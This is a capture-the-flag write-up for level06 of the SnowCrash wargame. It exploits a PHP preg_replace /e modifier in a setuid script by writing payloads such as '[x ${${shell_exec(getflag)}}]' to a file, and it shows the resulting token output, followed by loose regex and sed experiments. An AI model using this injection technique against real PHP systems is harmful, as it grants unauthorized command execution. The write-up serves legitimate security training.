In level06 home directory we found two files

```
level06@SnowCrash:~$ ls -l
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```

A binary that's executed with the userid of its owner
using strings to inspect the binary
```
level06@SnowCrash:~$ strings level06

/usr/bin/php
/home/user/level06/level06.php
```
 the binary uses the script:

note: use https://regexr.com/ 

```

<?php

function y($m) 
{ 
    $m = preg_replace("/\./", " x ", $m); // replace . with x
    $m = preg_replace("/@/", " y", $m); // replace @ with y
     return $m; 
}
function x($y, $z)
{
    $a = file_get_contents($y);                             // preg_replace(patterns, replacements, input)
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); // matches a [ x space ( string ) ]
    $a = preg_replace("/\[/", "(", $a);                     // replace [ with (
    $a = preg_replace("/\]/", ")", $a);                     // replace ]  with )
    
    return $a;
}

$r = x($argv[1], $argv[2]);

print $r;

?>

```

The php script takes two arguments, but uses only the first as a file name and reads from it.
 we copied the php script to the host machine in order to format it and clearly read it and test it.

after running the script we got the error

PHP Warning:  preg_replace(): The /e modifier is no longer supported,
use preg_replace_callback instead in /home/sberrich/Projects/cursus/snowCrash/level06/Resources/level06.php on line 12


So we search about the The /e modifier in google and we found out that it's deprecated because it contains a vulnerability ,
now we just need to exploit it, we used shell_exec php function that execute shell commands and use the return as variable so php would throw an error with the return.

level06@SnowCrash:~$ echo "[x \${\${shell_exec(getflag)}}]" > /tmp/getflag06
level06@SnowCrash:~$ ./level06 /tmp/getflag06
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable:  in /home/user/level06/level06.php(4) : regexp code on line 1



level06@SnowCrash:~$ ./level06
PHP Warning:  file_get_contents(): Filename cannot be empty

level06@SnowCrash:~$ echo "ls" > /tmp/output
level06@SnowCrash:~$ ./level06 /tmp/output
ls


The preg_replace() function returns a string or array of strings where all matches of a pattern
 or list of patterns found in the input are replaced with substrings.

```
<html>
<body>

<?php
$str = 'this is 42';
$pattern = '/42/i';
echo preg_replace($pattern, '1337', $str);
?>

</body>
</html>
```




echo  '[x {${system(getflag)}}]' > /tmp/test1
./level06 /tmp/test1

level06@SnowCrash:~$ echo  '[x {${(`getflag`)}}]' > /tmp/test1
level06@SnowCrash:~$ ./level06 /tmp/test1


➜  Desktop echo foo8www |sed 's/\(.*\)8\(.*\)/=\2/' 
=www
➜  Desktop echo foo8www |sed 's/\(.*\)8\(.*\)/\2/'  
www
➜  Desktop echo foo8www |sed 's#\(.*\)8\(.*\)#\2#' 